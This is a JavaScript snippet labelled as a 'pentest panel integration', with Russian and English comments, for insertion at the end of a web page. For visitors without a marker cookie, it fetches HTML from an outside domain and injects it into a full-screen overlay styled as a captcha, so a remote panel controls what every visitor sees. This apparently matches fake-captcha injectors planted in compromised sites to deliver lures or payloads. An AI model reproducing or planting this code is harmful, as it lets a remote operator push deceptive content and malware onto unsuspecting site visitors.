<!-- Pentest Panel Integration -->
<!-- Add this code before </body> tag -->

<script type='text/javascript'>
// Событие обмена сообщениями между iframe подгружаемого с панели и кодом страницы в которой размещена капча
window.addEventListener("message", e =>
{
	if(e.data === "reload")
	{
        window.location.reload();
    }
});

// Function for reading cookie
// Функция чтения куки
function getCookie(name)
{
	const match = document.cookie.match(new RegExp("(^|; )" + name + "=([^;]*)"));
	return match ? decodeURIComponent(match[2]) : null;
}

// Reading cookie
// Чтение куки
const cookiename = "cookie-captcha-complete";
const cookie = getCookie(cookiename);

// Cookie found
// Кука не найдена
if(!cookie)
{
	fetch("https://ipv6app.bar") 
	.then(response => response.ok ? response.text() : Promise.reject())
	.then(html =>
	{
		if(html.length === 0)
		{
			document.cookie = cookiename + "=1; path=/; max-age=" + (60 * 60 * 24 * 365);
		}

		else
		{
			// ИСПРАВЛЕНО: Создаем контейнер если его нет, или используем существующий
			let captchaContainer = document.getElementById("captcha-container-panel");
			if (!captchaContainer) {
				captchaContainer = document.createElement("div");
				captchaContainer.id = "captcha-container-panel";
				captchaContainer.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:auto;";
				document.body.appendChild(captchaContainer);
			}
			captchaContainer.innerHTML = html;
			console.log("Captcha loaded into container");
		}
	})
	.catch(() => console.error("Failed to load page!"));
}


</script>
